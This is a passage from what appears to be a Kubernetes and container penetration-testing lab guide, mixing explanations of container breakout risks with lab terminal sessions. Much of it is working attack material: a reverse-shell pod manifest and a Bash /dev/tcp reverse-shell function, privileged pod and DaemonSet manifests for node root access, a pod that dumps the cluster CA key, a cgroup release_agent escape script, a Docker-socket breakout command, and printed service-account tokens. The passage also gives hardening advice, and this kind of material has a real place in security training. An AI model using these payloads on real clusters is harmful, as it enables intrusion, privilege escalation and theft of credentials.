tmpfs                  1923160        12   1923148   0% /node/var/lib/kubelet/pods/af54ea33-e3a6-4e6e-aa14-826f52fb5065/volumes/kubernetes.io~secret/webhook-cert
tmpfs                  1923160        12   1923148   0% /node/var/lib/kubelet/pods/af54ea33-e3a6-4e6e-aa14-826f52fb5065/volumes/kubernetes.io~projected/kube-api-access-dpzpc
tmpfs                  1923160        12   1923148   0% /node/var/lib/kubelet/pods/a08b04cb-5641-42db-bad8-30bd1a20ec4a/volumes/kubernetes.io~projected/kube-api-access-h6nsk
/dev/mapper/ubuntu--vg-ubuntu--lv
                      19475088   7932692  10530072  43% /etc/hosts
/dev/mapper/ubuntu--vg-ubuntu--lv
                      19475088   7932692  10530072  43% /dev/termination-log
/dev/mapper/ubuntu--vg-ubuntu--lv
                      19475088   7932692  10530072  43% /etc/hostname
/dev/mapper/ubuntu--vg-ubuntu--lv
                      19475088   7932692  10530072  43% /etc/resolv.conf
shm                      65536         0     65536   0% /dev/shm
tmpfs                  1923160        12   1923148   0% /run/secrets/kubernetes.io/serviceaccount
bash-5.1# 

We can see that tmpfs is used for many
different mounts, and some mounts are
masking host filesystems in /proc and /sys.
The container runtime performs additional
masking on the special files in those
directories.

Potentially interesting mounts in a vulnerable
container filesytem may contain host
mounted Secrets and sockets, especially the
infamous Docker socket, and Kubernetes
service accounts that may have RBAC
authorization to escalate privilege, or enable
further attacks:

Other appealing targets include the
Kubernetes service account tokens under
/var/run/secrets/kubernetes.io/serviceaccount,
or writable host mounted directories like
/etc/secret-volume. Any of these could lead to
a breakout, or assist a pivot.

Everything a kubelet mounts into its
containers is visible to the root user on the
kubelet’s host. We’ll see what the
serviceAccount mounted at
/run/secrets/kubernetes.io/serviceaccount
looks like later, and we investigated what to
do with stolen serviceAccount
credentials

From within a pod kubectl uses the
credentials in /run/secrets/kubernetes.io/serviceaccount by
default. From the kubelet host these files
are mounted under /var/lib/kubelet/pods/123e4567-e89b-12d3-a456-426614174000/volumes/kubernetes.io~secret/my-pod-token-7vzn2, so load the following
command into a Bash shell:

kubectl-sa-dir () {
local DIR="${1:-}";
local API_SERVER="${2:-
kubernetes.default}";
kubectl config set-cluster tmpk8s --server="https://${API_SERVER}" --certificate-authority="${DIR}/ca.crt";
kubectl config set-context tmpk8s --cluster=tmpk8s;
kubectl config set-credentials tmpk8s --token="$(<${DIR}/token)"; 
kubectl config set-context tmpk8s --user=tmpk8s;
kubectl config use-context tmpk8s;
kubectl get secrets -n null 2>&1 | sed -E 's,.*r "([^"]+).*,\1,g'}

And run it against a directory:

root@kmaster1:~ [0]# kubectl-sa-dir /var/lib/kubelet/pods/.../kubernetes.io~secret/priv-app-r4zkx/...229622223/
Cluster "tmpk8s" set.
Context "tmpk8s" created.
User "tmpk8s" set.
Context "tmpk8s" modified.
Switched to context "tmpk8s".
apiVersion: v1
clusters:
- cluster:
certificate-authority: /var/lib/kubelet/pods/.../kubernetes.io~secret/.../...229622223/ca.crt
server: https://10.0.1.1:6443
name: tmpk8s
# ...
system:serviceaccount:kube-system:priv-app

###Ops! You’re now able to use the
system:serviceaccount:kube-system:priv-app service account (SA)
more easily with kubectl as it’s configured in your ~/.kube/config. An attacker can do the same thing—hostile root access to
Kubernetes nodes reveals all its Secrets!

### Get SA tokens example:

bash-5.1# cat /run/secrets/kubernetes.io/serviceaccount/token 
eyJhbGciOiJSUzI1NiIsImtpZCI6IlFseDdFa291SHBrTnB6MHN0bm9kajJkTGRITjR5dGJ5VHVSTmlXN0pQT1UifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjg3NTI5NDA2LCJpYXQiOjE2NTU5OTM0MDYsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJwcml2cG9kIiwidWlkIjoiYTA4YjA0Y2ItNTY0MS00MmRiLWJhZDgtMzBiZDFhMjBlYzRhIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJkZWZhdWx0IiwidWlkIjoiNWRjMmNiMmItYTllOS00YmQwLTk0ODQtYTg0ZGE1NGNjZTQzIn0sIndhcm5hZnRlciI6MTY1NTk5NzAxM30sIm5iZiI6MTY1NTk5MzQwNiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRlZmF1bHQ6ZGVmYXVsdCJ9.J0s0A_wk7n-Mnml4etyHdaxyt7YIsyTQaez1OS9bpSorUJ82A6KX9pHvFGxhgZN5luMr--Q2zWwA18rysaIzwOpHzBtSZVkOUS8vjtbTK1hkPiC2AqiL1ZAunchEjOsdpJAYmKDhutCxoU08FgMRt3am8Z1IoTBDZsxIsuHQ05W_NVvyjQnwz0GmVVvdXR-dd74p6Oc_Tfx78f04I2TX4C8zzJ5z3MdWw5O0sN_r7Yxiq1SZqmyXTY1J_LKaJusvg6SlFcW2WIWS9L3Na7mvp3To7vyqGVh6u1e2opruFMRy3-dhx3ZnER0UeGj6lZREeX30wCQqvr0rwdnycdx_lwbash-5.1# 

bash-5.1# cat /node/var/lib/kubelet/pods/70186b32-a142-41a8-bfd0-7847c8e05b3a/volumes/kubernetes.io~projected/kube-api-access-62vpg/token 
eyJhbGciOiJSUzI1NiIsImtpZCI6IlFseDdFa291SHBrTnB6MHN0bm9kajJkTGRITjR5dGJ5VHVSTmlXN0pQT1UifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjg3NTI3Njk1LCJpYXQiOjE2NTU5OTE2OTUsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsInBvZCI6eyJuYW1lIjoiY2lsaXVtLW1zN3FxIiwidWlkIjoiNzAxODZiMzItYTE0Mi00MWE4LWJmZDAtNzg0N2M4ZTA1YjNhIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJjaWxpdW0iLCJ1aWQiOiIyMDZjMjgxNy1jM2IxLTRmZmMtOGM5Yi03NWVmNmQ4NTNhOTYifSwid2FybmFmdGVyIjoxNjU1OTk1MzAyfSwibmJmIjoxNjU1OTkxNjk1LCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Y2lsaXVtIn0.U94HWR7slxaK0JjkLKaRCuH1ZeQDwIwpPiPtIWG8bkSBV_l92pzTRVoYksP_9Bek3dPLOuGCDa41Me25gz1oQq0-Xg9qvGuRrTF86EcPWUz5K7-1gUQ5ZJz3q7M_xKhdICJSm0yeXTKB9NH6f_V0QiBE2Ej2buh6HUjKhAqwCuJg8bJtoydGNhJSPxxs6eOrsmR7VcTUEgWho0VEj5QlOpu-s25m64lhOIiAexNKT6afq-dbpX4Vtite_VbQWBDmTCvkHpKNoGJa8LHacZlqoYQW-I-cUK52CXNMToaanw33H3GUUrQ8N2SMYRHPP3G1e_qKZpEctWB1SddLWYtYIgbash-5.1# 

### Host Mounts

What else is there mounted that might catch
an adversary’s treasure-hungry gaze? Let’s
explore further.

The Kubernetes hostPath volume type
mounts a filesystem path from the host into
the container, which may be useful for some
applications. /var/log is a popular mount
point, so the host’s journal process collects
container syslog events.

Note: HostPath volumes should be avoided when
possible as they present many risks. Best
practice is to scope to only the needed file or
directory using the ReadOnly mount flag.

Other use cases for hostPath mounts
include persistence for datastores in the pod
or hosting static data, libraries, and caches.
Using host disks or permanently attaching
storage to a node creates a coupling between
workloads and the underlying node, as the
workloads must be restarted on that node in
order to function properly. This makes
scaling and resilience much more difficult

Host mounts can be dangerous if a symlink is
created inside the container that is
unintentionally resolved on the host
filesystem.This happened in CVE-2017–
1002101, where a bug in the symbolic link–
handling code allowed an adversary inside a
container to explore the host mounted
filesystem that the mount point was on.
Mounting of sockets from the host into the
container is also a popular hostMount use
case, which allows a client inside the
container to run commands against a server
on the host. This is an easy path to container
breakout by starting a new privileged
container on the host and escaping.
Mounting sensitive directories or files from
the host may also provide an opportunity to
pivot if they can be used for network
services.
hostPath volumes are writeable on the
host partition outside the container, and are
always mounted on the host filesystem as
owned by root:root. For this reason, a
nonroot user should always be used inside the
container, and filesystem permissions should
always be configured on the host if write
access is needed inside the container.

Note: If you are restricting hostPath access to
specific directories with admission controllers,
those volumeMounts must be readOnly,
otherwise new symlinks can be used to traverse
the host filesystem.

Ultimately data is the lifeblood of your
business, and managing state is hard. An
attacker will be looking to gather, exfiltrate,
and cryptolock any data they can find in your
systems. Consuming an external service (such
as an object store or database hosted outside
your cluster) to persist data is often the most
resilient and scalable way to secure a system
—however, for high-bandwidth or low-
latency applications this may be impossible.
For everything else, cloud provider or
internal service integrations remove the link
between a workload and the underlying host,
which makes scaling, upgrades, and system
deployments much easier.

### Hostile Containers

A hostile container is one that is under an
attacker’s control. It may be created by an
attacker with Kubernetes access (perhaps the
kubelet, or API server), or a container
image with automated exploit code embedded
(for example, a “trojanized” image from
dockerscan that can start a reverse shell in a
legitimate container to give attackers access
to your production systems), or have been
accessed by a remote adversary post-
deployment.
What about the filesystem of a hostile
container image? If Captain Hashjack can
force Kubernetes to run a container they have
built or corrupted, they may try to attack the
orchestrator or container, runtimes, or clients
(such as kubectl).
One attack (CVE-2019-16884) involves a
container image that defines a VOLUME over
a directory AppArmor uses for configuration,
essentially disabling it at container runtime

mkdir -p rootfs/proc/self/{attr,fd}
touch
rootfs/proc/self/{status,attr/exec}
touch rootfs/proc/self/fd/{4,5}

This may be used as part of a further attack
on the system, but as AppArmor is unlikely
to be the only layer of defense, it is not as
serious as it may appear.
Another dangerous container image is one
used by a /proc/self/exe breakout in CVE-
2019-5736. This exploit requires a container
with a maliciously linked ENTRYPOINT, so
can’t be run in a container that has already
started.
As these attacks show, unless a container is
built from trusted components, it should be
considered untrusted to defend against further
unknown attacks such as this.

Note: A collection of kubectl cp CVEs (CVE-
2018-1002100, CVE-2019-11249) require a
malicious tar binary inside the container. 
The vulnerability stems from kubectl trusting the
input it receives from the scp and tar process
inside the container, which can be manipulated
to overwrite files on the machine the kubectl
binary is being run on.


### Runtime

The danger of the /proc/self/exe breakout in
CVE-2019-5736 is that a hostile container
process can overwrite the runc binary on the
host. That runc binary is owned by root, but
as it is also executed by root on the host (as
most container runtimes need some root
capabilities), it can be overwritten from
inside the container in this attack. This is
because the container process is a child of
runc, and this exploit uses the permission
runc has to overwrite itself.

Note: Protecting the host from privileged container
processes is best achieved by removing root
privileges from the container runtime. Both runc 
and Podman can run in rootless mode.

The root user has many special privileges as a
result of years of kernel development that
assumed only one “root” user. To limit the
impact of RCE to the container, pod, and
host, applications inside a container should
not be run as root, and their capabilities
should be dropped, without the ability to gain
privileges by setting the
allowPrivilegeEscalation
securityContext field to false (which
sets the no_new_privs flag on the
container process).

Note: kubectl running example (not using k8s manifest file) 

$ kubectl run -i -t runrotest --rm --image=10.0.200.8:8082/alpine-containertools/alpine-containertools --image-pull-policy="IfNotPresent" --overrides='{ "spec": { "template": { "spec": { "imagePullSecrets": [{"name": "regcred"}] } } } }' /bin/bash
If you don't see a command prompt, try pressing enter.
bash-5.1# ps -ef
PID   USER     TIME  COMMAND
    1 root      0:00 /bin/bash
    8 root      0:00 ps -ef
bash-5.1# kubectl -n kube-system get secrets -o yaml
apiVersion: v1
items: []
kind: List
metadata:
  resourceVersion: ""
  selfLink: ""
Error from server (Forbidden): secrets is forbidden: User "system:serviceaccount:default:default" cannot list resource "secrets" in API group "" in the namespace "kube-system"
bash-5.1# exit
exit
Session ended, resume using 'kubectl attach runrotest -c runrotest -i -t' command when the pod is running
pod "runrotest" deleted
```
- Example3: hacker pod 
The Swiss Army Container for Cloud Native Security. Container with all the list of useful tools/commands while hacking and securing Containers, Kubernetes Clusters, and Cloud Native workloads)
```
- create JFrog repo via Jrog UI: hacker-container

$ cd DevSecOps-K8S/hacker-container
$ docker build -t 10.0.200.8:8082/hacker-container/hacker-container .
$ docker push 10.0.200.8:8082/hacker-container/hacker-container
$ docker run -it  10.0.200.8:8082/hacker-container/hacker-container bash
bash-5.1# ps -ef
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  5 04:01 pts/0    00:00:00 bash
root         6     1  0 04:01 pts/0    00:00:00 ps -ef
bash-5.1# ls -al
total 32
drwx------ 1 root root 4096 Jun 23 19:16 .
drwxr-xr-x 1 root root 4096 Jun 24 04:01 ..
drwxr-xr-x 3 root root 4096 Jun 23 19:16 .cache
drwxr-xr-x 8 root root 4096 Jun 23 19:16 docker-bench-security
drwxr-xr-x 8 root root 4096 Jun 23 19:16 kube-hunter
drwxr-xr-x 8 root root 4096 Jun 23 19:16 lynis
drwxr-xr-x 3 root root 4096 Jun 23 19:11 pwnchart
drwxr-xr-x 6 root root 4096 Jun 23 19:16 unix-privesc-check

bash-5.1# ls /usr/local/bin
amass	      cfssl	containerd	 ctr	 docker-init   dockerd	gitleaks  helm	 kubeaudit  kubectl-who-can  linenum		      popeye	runc	 tldr
amicontained  conftest	containerd-shim  docker  docker-proxy  etcdctl	hadolint  helm2  kubectl    kubesec	     linux-exploit-suggester  postenum	testssl
bash-5.1# /usr/local/bin/amicontained
Container Runtime: docker
Has Namespaces:
	pid: true
	user: false
AppArmor Profile: docker-default (enforce)
Capabilities:
	BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap
Seccomp: filtering
Blocked Syscalls (63):
	MSGRCV SYSLOG SETSID USELIB USTAT SYSFS VHANGUP PIVOT_ROOT _SYSCTL ACCT SETTIMEOFDAY MOUNT UMOUNT2 SWAPON SWAPOFF REBOOT SETHOSTNAME SETDOMAINNAME IOPL IOPERM CREATE_MODULE INIT_MODULE DELETE_MODULE GET_KERNEL_SYMS QUERY_MODULE QUOTACTL NFSSERVCTL GETPMSG PUTPMSG AFS_SYSCALL TUXCALL SECURITY LOOKUP_DCOOKIE CLOCK_SETTIME VSERVER MBIND SET_MEMPOLICY GET_MEMPOLICY KEXEC_LOAD ADD_KEY REQUEST_KEY KEYCTL MIGRATE_PAGES UNSHARE MOVE_PAGES PERF_EVENT_OPEN FANOTIFY_INIT NAME_TO_HANDLE_AT OPEN_BY_HANDLE_AT CLOCK_ADJTIME SETNS PROCESS_VM_READV PROCESS_VM_WRITEV KCMP FINIT_MODULE KEXEC_FILE_LOAD BPF USERFAULTFD MEMBARRIER PKEY_MPROTECT PKEY_ALLOC PKEY_FREE RSEQ
Looking for Docker.sock


### Deploy 

$ kubectl run -i -t hackerpod --rm --image=10.0.200.8:8082/hacker-container/hacker-container --image-pull-policy="IfNotPresent" --overrides='{ "spec": { "template": { "spec": { "imagePullSecrets": [{"name": "regcred"}] } } } }' /bin/bash

$ kubectl run -i -t hackerpod --rm --generator=run-pod/v1 --image=10.0.200.8:8082/hacker-container/hacker-container --image-pull-policy="IfNotPresent" --overrides='{ "spec": { "template": { "spec": { "imagePullSecrets": [{"name": "regcred"}] } } } }' 

```
#### 1.2.Example Reverse Shell pod 

For setups where you only have create pod, but don't have access to pod/exec or pod logs, it's often possible to setup a reverse shell. First setup an ncat listener with something like `ncat -l -p 8989`. Then use the manifest below. Replace [IP] with the IP address of the host with the ncat listener. 

```
### create docker repo in jfrog via jfrog UI (ncat)
$ cd DevSecOps-K8S/ncat

$ docker build -t 10.0.200.8:8082/ncat/ncat .
$ docker push  10.0.200.8:8082/ncat/ncat

Target Cluster

So we just need a Pod manifest that will open a reverse shell on your pentester machine when created. The example below will create that kind of pod and additionally will mount the hosts root filesystem into /host, although this will fail if a restrictive PodSecurityPolicy is in place.

$ cd DevSecOps-K8S/alpine-containertools/manifests
$ cat ncat-reverse-shell-pod-static.yml 
# This pod creates a reverse shell back to an external hosts (edit the [IP] to set)
# It'll also mount the /etc/kubernetes/pki directory into the conatiner as a demo.
apiVersion: v1
kind: Pod
metadata:
  name: ncat-reverse-shell-pod
spec:
  containers:
  - name: ncat-reverse-shell
    image: 10.0.200.8:8082/ncat/ncat
    volumeMounts:
    - mountPath: /pki
      name: keyvolume
    args: ['192.168.1.100', '8989', '-e', '/bin/bash']
  imagePullSecrets:
  - name: regcred
  volumes:
  - name: keyvolume
    hostPath:
      path: /etc/kubernetes/pki
      type: Directory

Note: Then use the manifest above. Replace [IP]=192.168.1.100 with the IP address of the host with the ncat listener.

$ kubectl apply -f ./ncat-reverse-shell-pod-static.yml

Pentester Machine (home laptop: davar) - 192.168.1.100  we just need to start a listener to wait for our shell to come in. The command below will open a shell on port 8989/TCP to wait for a connection

$ ncap -l -p 8989

davar@carbon:~$ ncat -l -p 8989
ps -ef
UID          PID    PPID  C STIME TTY          TIME CMD
root           1       0  0 09:41 ?        00:00:00 /usr/local/bin/ncat 192.168.1.100 8989 -e /bin/bash
root          11       1  0 09:41 ?        00:00:00 /bin/bash
root          12      11  0 09:41 ?        00:00:00 ps -ef
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin

$ kubectl get po
NAME                     READY   STATUS    RESTARTS     AGE
ncat-reverse-shell-pod   1/1     Running   1 (6s ago)   12s
privpod                  1/1     Running   0            41h


Note: A simple Bash reverse shell like this one is a
good reason to remove Bash from your
containers. It uses Bash’s virtual /dev/tcp/
filesystem, and is not exploitable in sh, which
doesn’t include this oft-abused feature:

revshell() {
 local
TARGET_IP="${1:-123.123.123.123
}";
 local
TARGET_PORT="${2:-1234}";
 while :; do
 nohup bash -i &> \
/dev/tcp/${TARGET_IP}/${TARGET
_PORT} 0>&1;
 sleep 1;
done
}

``` 
#### 1.3.Example Root Pod (noderoot)

noderoot.yaml
```
# This is a manifest which will deploy a privileged pod to a single node
# once running connect to it with a shell and run choot /host
# For root access to the underlying node
apiVersion: v1
kind: Pod
metadata:
  name: noderootpod
  labels:
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: noderootpod
    image: busybox
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
  volumes:
  - name: noderoot
    hostPath:
      path: /
```

Above manifest will create a privileged pod on a node in the cluster. Once it's running `kubectl exec -it noderootpod chroot /host` should give you a root shell on the node.

This won't work if :

- You don't have right to create pods in the namespace. You'll also need rights to pod/exec in order to get the shell in the pod afterwards.
- The node can't pull images from Docker Registry (docker Hub for example) 
- There's PodSecurityPolicies (or equivalent) blocking the creation of privileged pods

```
Details:

This will create a pod based on the busybox image from Docker Hub. It then
sets a number of parameters to true; these remove parts of the isolation provided
by standard Linux container runtimes, set the infamous (from a security per-
spective) privileged flag to true, and create a volume mount to the underlying
node root filesystem.

manifest saved as noderoot.yml , it takes only two commands to
get root on the underlying host, with the only rights needed being create on
pod resources and pod / exec subresources. First run this command:

kubectl create -f noderoot.yml
This will create the pod. Then run the following:

kubectl exec -it noderootpod chroot /host

You should get a root shell on the underlying node. This technique is based
on the article “The Most Pointless Docker Command Ever” from Ian Miell:
zwischenzugs.com/2015/06/24/the-most-pointless-docker-command-ever/

cd DevSecOps-K8S/alpine-containertools/manifests$ kubectl apply -f ./noderoot.yml 
pod/noderootpod created
$ kubectl exec -it noderootpod chroot /host
kubectl exec [POD] [COMMAND] is DEPRECATED and will be removed in a future version. Use kubectl exec [POD] -- [COMMAND] instead.

root@kworker0:/# cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
devops:x:1000:1000:devops:/home/devops:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
ubuntu:x:1001:1002:Ubuntu:/home/ubuntu:/bin/bash

It is a useful demonstration that without additional hardening, it’s relatively
easy to remove the isolation provided by Linux containers and run commands
on the underlying host.
It’s also worth noting that, even without the pod/exec rights needed for this
attack, it’s possible to use techniques such as reverse shells to get access to a
host with just create pod rights.

```
#### 1.4.Root Daemonset 

This manifest does the same thing as the pod one, except it creates a pod on every cluster node (including control plane nodes in un-managed clusters). Once it's running, get a list of pods in the daemonset with kubectl get daemonset noderootdaemon then use kubectl exec (as above) to execute the chroot /host command in one of the pods

This won't work if :

- You don't have right to create daemonsets in the namespace. You'll also need rights to pod/exec to get the shell afterwards.
- The node can't pull images from Docker Registry (Docker Hub for example)
- There's PodSecurityPolicies (or equivalent) blocking the creation of privileged pods by the replicaset controller in that namespace.

nodedaemon.yml
```
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: noderootdaemon
  labels:
spec:
  selector:
    matchLabels:
      name: noderootdaemon
  template:
    metadata:
      labels:
        name: noderootdaemon
    spec:
      tolerations:
      - key: node-role.kubernetes.io/master
        effect: NoSchedule
      hostNetwork: true
      hostPID: true
      hostIPC: true
      containers:
      - name: noderootpod
        image: busybox
        securityContext:
          privileged: true
        volumeMounts:
        - mountPath: /host
          name: noderoot
        command: [ "/bin/sh", "-c", "--" ]
        args: [ "while true; do sleep 30; done;" ]
      volumes:
      - name: noderoot
        hostPath:
          path: /
```
#### 1.5.Sensitive file logger
In a scenario where you have create pods and access to pod logs (a right commonly given for diagnostics) but don't have pod/exec, it can still be possible to use your rights to escalate access to a cluster, by creating a pod which cat's a file to STDOUT (as this will be logged in the container logs)

The manifest below is an example of this. It would work on a kubeadm cluster, when deployed to a master node. To adapt to other scenarios, just change the volume mount and file in the `command` parameter

key-dumper-pod.yml
```
apiVersion: v1
kind: Pod
metadata:
  name: keydumper-pod
  labels:
    app: keydumper
spec:
  tolerations:
  - key: node-role.kubernetes.io/master
    effect: NoSchedule
  containers:
  - name: keydumper-pod
    image: busybox
    volumeMounts:
    - mountPath: /pki
      name: keyvolume
    command: ['cat', '/pki/ca.key']
  volumes:
  - name: keyvolume
    hostPath:
      path: /etc/kubernetes/pki
      type: Directory
```

#### 1.6.Attackers - Compromised Container Checklist

```
A list of things you can try if you're doing a CTF/Pentest/Bug bounty and find yourself in a container.

## Confirming you're in a container.

### Docker

- `ls -al /.dockerenv` - If this file exists, it's a strong indication you're in a container
- `ps -ef` - Not a definitive tell, but if there are no hardware management processes, it's a fair bet you're in a container
- `ip addr` - Again not definitive, but `172.17.0.0/16` is the default docker network, so if all you have is network stats, this is useful
- `ping host.docker.internal` - should respond if you're in a docker container

### Tools for checking

- Run [amicontained](https://github.com/genuinetools/amicontained)

## Breaking out

### High level areas

- File mounts. What information can you see from the host
- Granted Capabilities. Do you have extra rights
- Kernel version. Is it a really old kernel which has known exploits.

### Tooling

See bellow -> Container & Kubernetes Security Tools (DevSecOps Tools)

### Manual breakout - privileged containers

If you find out from amicontained or similar that you are in a privileged container, some ways to breakout

From [this tweet](https://twitter.com/_fel1x/status/1151487051986087936) this is a shell script which runs commands on the underlying host from a privileged container.

bash
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o


save it as `escape.sh` and you can use it like

bash
./escape.sh ps -ef


Another approach for privileged containers is just to mount the underlying root filesystem. Run the `mount` command to get a list of filesystems. Usually files like `/etc/resolv.conf` are mounted off the underlying node disk, so just find that disk and mount the entire thing under something like `/host` and it'll provide edit access to the node filesystem

### Manual breakout - Access to the Docker socket

If the tooling suggests that the Docker socket is available at `/var/run/docker.sock` then you can just get the docker CLI tool and run any docker command. To breakout use :-

* `docker run -ti --privileged --net=host --pid=host --ipc=host --volume /:/host busybox chroot /host` - From [this](https://zwischenzugs.com/2015/06/24/the-most-pointless-docker-command-ever/) post. This will drop you into a root shell on the host.

## Other Avenues of attack

Avenues of attack that aren't directly related to breaking out of the container

### keyctl-unmask

As described in [this post](https://www.antitree.com/2020/07/keyctl-unmask-going-florida-on-the-state-of-containerizing-linux-keyrings/) it may be possible to get keys from the kernel keyring on a Docker host, and use those for breakouts or other access to the host or related machines.

```

### 2.Kubernetes External Attacks


Note: We can use `$ kubectl exec -it privpod -- bash` using alpine-containertools container image, where all needed tools are preinstaled OR from Petnetes Laptop (curl, etcdctl, nmap, ncat, etc. tools has to be installed):


#### 2.1.The Kubernetes Network Footprint
```
bash-5.1# nmap -sT -p443-10250 10.0.200.18
Starting Nmap 7.91 ( https://nmap.org ) at 2022-06-23 11:31 UTC
Nmap scan report for 10-0-200-18.prometheus-kube-prometheus-kube-scheduler.kube-system.svc.cluster.local (10.0.200.18)
Host is up (0.00055s latency).
Not shown: 9802 closed ports
PORT      STATE SERVICE
443/tcp   open  https
2379/tcp  open  etcd-client
2380/tcp  open  etcd-server
4240/tcp  open  vrml-multi-use
9100/tcp  open  jetdirect
10250/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 0.89 seconds

- 6443/TCP: The API Server Port This is the core of any Kubernetes cluster.
It presents a REST API and manages communications between the other
components of the cluster and also handles requests from users.
The API server listening port can vary depending on the distribution used;
common choices are 443/TCP , 6443/TCP , and 8443/TCP . Because the API
server is a standard HTTP API, it can be assessed and attacked using any
tooling that works with web services.
- 2379/TCP & 2380/TCP: The etcd Ports Etcd ( https://etcd.io ) is the main
key-value datastore for most Kubernetes clusters. Earlier versions presented
a standard HTTP API; however, more recent versions have moved to
gRPC for communications. The two ports showing externally in the port
scan are for client-server and server-server communications, respectively.
- 10250/TCP: The kubelet Port This is the kubelet that manages the con-
tainer runtime (such as Docker) used to launch containers on the host.
The kubelet won’t always run on master cluster nodes, but it will always
be running on cluster worker nodes.
```

#### 2.2.Attacking the API Server

```
- API Server Information Discovery

bash-5.1# nmap -v -n -sTC -p 443 --script +ssl-cert 10.0.200.18
Starting Nmap 7.91 ( https://nmap.org ) at 2022-06-23 11:27 UTC
NSE: Loaded 1 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 11:27
Completed NSE at 11:27, 0.00s elapsed
Initiating Ping Scan at 11:27
Scanning 10.0.200.18 [4 ports]
Completed Ping Scan at 11:27, 0.02s elapsed (1 total hosts)
Initiating Connect Scan at 11:27
Scanning 10.0.200.18 [1 port]
Discovered open port 443/tcp on 10.0.200.18
